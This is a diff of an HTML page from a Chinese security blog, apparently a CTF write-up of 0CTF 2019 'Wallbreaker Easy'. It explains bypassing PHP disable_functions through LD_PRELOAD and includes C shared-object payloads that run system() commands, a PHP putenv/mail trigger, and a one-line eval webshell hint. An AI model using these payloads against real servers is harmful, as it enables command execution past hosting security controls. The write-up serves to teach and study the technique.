@@ -15,11 +15,11 @@
 
 
 <html class="theme-next mist use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
 
 
 
@@ -44,9 +44,9 @@
 
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
 
-<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico?v=7.1.0">
@@ -96,24 +96,20 @@
 
 
 
-  <meta name="description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
-0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
-index.php123456Imag">
+  <meta name="description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。 index.php123456Imag">
+<meta name="keywords" content="Web,php">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用LD_PRELOAD绕过disbale_functions">
 <meta property="og:url" content="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/index.html">
-<meta property="og:site_name" content="Windylh's blog">
-<meta property="og:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
-0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
-index.php123456Imag">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。 index.php123456Imag">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png">
 <meta property="og:updated_time" content="2019-03-27T00:54:26.948Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用LD_PRELOAD绕过disbale_functions">
-<meta name="twitter:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
-0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
-index.php123456Imag">
+<meta name="twitter:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。 index.php123456Imag">
 <meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png">
 
 
@@ -122,7 +118,7 @@ index.php123456Imag">
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/">
 
 
 
@@ -200,7 +196,7 @@ index.php123456Imag">
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
+    <button aria-label="Toggle navigation bar">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -228,7 +224,7 @@ index.php123456Imag">
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
 
   </li>
         
@@ -245,7 +241,7 @@ index.php123456Imag">
 
     
 
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Schlagwörter</a>
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
 
   </li>
         
@@ -262,7 +258,7 @@ index.php123456Imag">
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
 
   </li>
 
@@ -314,16 +310,16 @@ index.php123456Imag">
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/"/>
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"/>
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog"/>
+      <meta itemprop="name" content="Windylh's blog">
     </span>
 
     
@@ -350,14 +346,14 @@ index.php123456Imag">
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2019-03-26 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-26T00:00:00+08:00">2019-03-26</time>
+              <time title="Created: 2019-03-26 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-26T00:00:00+08:00">2019-03-26</time>
             
 
             
@@ -372,9 +368,9 @@ index.php123456Imag">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 
-                  <span class="post-meta-item-text">Bearbeitet am</span>
+                  <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Geändert am: 2019-03-27 08:54:26" itemprop="dateModified" datetime="2019-03-27T08:54:26+08:00">2019-03-27</time>
+                <time title="Modified: 2019-03-27 08:54:26" itemprop="dateModified" datetime="2019-03-27T08:54:26+08:00">2019-03-27</time>
               
             
           </span>
@@ -394,7 +390,7 @@ index.php123456Imag">
                 <i class="fa fa-eye"></i>
               </span>
               
-                <span class="post-meta-item-text">Aufrufe: </span>
+                <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
@@ -421,34 +417,34 @@ index.php123456Imag">
       
         <h2 id="0x00-0ctf2019-Wallbreaker-Easy"><a href="#0x00-0ctf2019-Wallbreaker-Easy" class="headerlink" title="0x00 0ctf2019-Wallbreaker Easy"></a>0x00 0ctf2019-Wallbreaker Easy</h2><p>在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过<code>LD_PRELOAD</code>绕过<code>disbale_functions</code>的方法。学到的东西在这里记录一下。</p>
 <h2 id="0x01-Wallbreaker-Easy-Writeup"><a href="#0x01-Wallbreaker-Easy-Writeup" class="headerlink" title="0x01 Wallbreaker Easy Writeup"></a>0x01 Wallbreaker Easy Writeup</h2><p>首先记录一下这道题的解题过程。</p>
-<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Imagick is a awesome library for hackers to break `disable_functions`.</div><div class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</div><div class="line">Let&apos;s try to execute `/readflag` to get the flag.</div><div class="line">Open basedir: /var/www/html:/tmp/415c92e8be7c68409ca6bd369d87482f</div><div class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</div></pre></td></tr></table></figure></p>
+<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Imagick is a awesome library for hackers to break `disable_functions`.</span><br><span class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</span><br><span class="line">Let&apos;s try to execute `/readflag` to get the flag.</span><br><span class="line">Open basedir: /var/www/html:/tmp/415c92e8be7c68409ca6bd369d87482f</span><br><span class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <p>index.php就是一句话木马，密码是<code>backdoor</code>。提示我们用<code>Imagick</code>插件绕过<code>disable_functions</code>，执行<code>/readflag</code>来获得flag。并给出了<code>open basedir</code>。</p>
 <p>首先查看一下<code>disable_functions</code>。payload:<code>backdoor=echo ini_get(&#39;disable_functions&#39;);</code></p>
 <p>除了默认设置禁用的pcntl的一系列函数还禁用了<code>system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</code>。</p>
 <p>一开始去找了<code>Imagick</code>插件的漏洞，但都在当前版本中被修复了。之后看到了<code>LD_PRELOAD</code>利用<code>mail()</code>函数绕过<code>disable_functions</code>的方法。和<code>Imagick</code>结合，成功拿到了flag。</p>
-<h2 id="0x02-Sendmail-LD-PRELOAD绕过disable-functions"><a href="#0x02-Sendmail-LD-PRELOAD绕过disable-functions" class="headerlink" title="0x02 Sendmail+LD_PRELOAD绕过disable_functions"></a>0x02 Sendmail+LD_PRELOAD绕过disable_functions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在 UNIX 的动态链接库的世界中，LD_PRELOAD 是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。</div></pre></td></tr></table></figure>
+<h2 id="0x02-Sendmail-LD-PRELOAD绕过disable-functions"><a href="#0x02-Sendmail-LD-PRELOAD绕过disable-functions" class="headerlink" title="0x02 Sendmail+LD_PRELOAD绕过disable_functions"></a>0x02 Sendmail+LD_PRELOAD绕过disable_functions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 UNIX 的动态链接库的世界中，LD_PRELOAD 是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。</span><br></pre></td></tr></table></figure>
 <p>当程序运行时需要调用系统共享对象中的函数时，我们可以通过设置<code>LD_PRELOAD</code>来优先加载我们编写的恶意代码来劫持原本系统共享对象的代码。</p>
 <p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数。</p>
 <p>很多文章以sendmail为例子。利用<code>readelf -Ws /usr/sbin/sendmail</code>查看其调用的库函数，从中选择了<code>geteuid()</code>函数来劫持。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span> <span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"ls &gt; /var/www/html/test.txt"</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</div><div class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    system(cmdline);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"ls &gt; /var/www/html/test.txt"</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>程序运行，共享库的<code>geteuid()</code>被调用时，通过<code>system()</code>执行命令。</p>
 <p>在尽量和服务器相同的环境中将它编译为一个共享对象。</p>
 <p><code>gcc -shared -fPIC exp.c -o exp.so</code></p>
 <p>将<code>.so</code>文件传输到服务器中，运用php代码设置为<code>LD_PRELOAD</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/exp.so"</span>);</div><div class="line">mail(<span class="string">"admin@admin.com"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/exp.so"</span>);</span><br><span class="line">mail(<span class="string">"admin@admin.com"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br></pre></td></tr></table></figure>
 <p>此时在/var/www/html/目录下就会产生test.txt。</p>
 <p>因为利用了sendmail调用<code>geteuid()</code>，进行了劫持，所以没有安装sendmail时无法使用这个函数。</p>
 <p>在这道题中，并没有sendmail，也就无法劫持getuid()函数。</p>
-<h3 id="0x03-C-语言扩展修饰符-attribute-constructor"><a href="#0x03-C-语言扩展修饰符-attribute-constructor" class="headerlink" title="0x03 C 语言扩展修饰符 attribute((constructor))"></a>0x03 C 语言扩展修饰符 <strong>attribute</strong>((constructor))</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GNU C 的一大特色就是__attribute__ 机制。__attribute__ 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。</div><div class="line"></div><div class="line">__attribute__ ((constructor))会使函数在main()函数之前被执行。</div></pre></td></tr></table></figure>
+<h3 id="0x03-C-语言扩展修饰符-attribute-constructor"><a href="#0x03-C-语言扩展修饰符-attribute-constructor" class="headerlink" title="0x03 C 语言扩展修饰符 attribute((constructor))"></a>0x03 C 语言扩展修饰符 <strong>attribute</strong>((constructor))</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GNU C 的一大特色就是__attribute__ 机制。__attribute__ 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor))会使函数在main()函数之前被执行。</span><br></pre></td></tr></table></figure>
 <p>如果我们在我们的函数之前采用这个修饰符，那么程序在加载系统共享对象的时候会优先执行我们的函数，这样就可以不用对特定的函数进行劫持，直接绕过<code>disable_functions</code>。</p>
-<p>修改后的payload：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</div><div class="line"></div><div class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"/readflag &gt; /tmp/415c92e8be7c68409ca6bd369d87482f/asd"</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</div><div class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    system(cmdline);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>修改后的payload：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"/readflag &gt; /tmp/415c92e8be7c68409ca6bd369d87482f/asd"</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>同时上传一个doc文件，用Imagick加载。</p>
-<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png" alt=""></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web1.png" alt></p>
 <p>因为没有了特定函数劫持的限制，只要我们执行mail函数，不管有没有安装sendmail都可以直接绕过<code>disable_functions</code>。</p>
-<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png" alt=""></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2019.3.25/web2.png" alt></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote>
-<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="external">PHP disable_functions Bypass 的方法探究</a><br><a href="https://www.cnblogs.com/hookjoy/p/10167315.html" target="_blank" rel="external">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c" target="_blank" rel="external">bypass_disablefunc_via_LD_PRELOAD/bypass_disablefunc.c</a></p>
+<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">PHP disable_functions Bypass 的方法探究</a><br><a href="https://www.cnblogs.com/hookjoy/p/10167315.html" target="_blank" rel="noopener">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD/bypass_disablefunc.c</a></p>
 </blockquote>
 
       
@@ -546,10 +542,10 @@ index.php123456Imag">
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -558,9 +554,7 @@ index.php123456Imag">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
-                alt="Windylh"/>
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg" alt="Windylh">
             
               <p class="site-author-name" itemprop="name">Windylh</p>
               <div class="site-description motion-element" itemprop="description"></div>
@@ -574,7 +568,7 @@ index.php123456Imag">
                   <a href="/archives/">
                 
                     <span class="site-state-item-count">32</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -619,7 +613,7 @@ index.php123456Imag">
                       
                     
                     <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">schlagwörter</span>
+                    <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
               
@@ -764,7 +758,7 @@ index.php123456Imag">
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.2.2</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
 
 
 
@@ -772,7 +766,7 @@ index.php123456Imag">
 
 
 
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
 
 
 
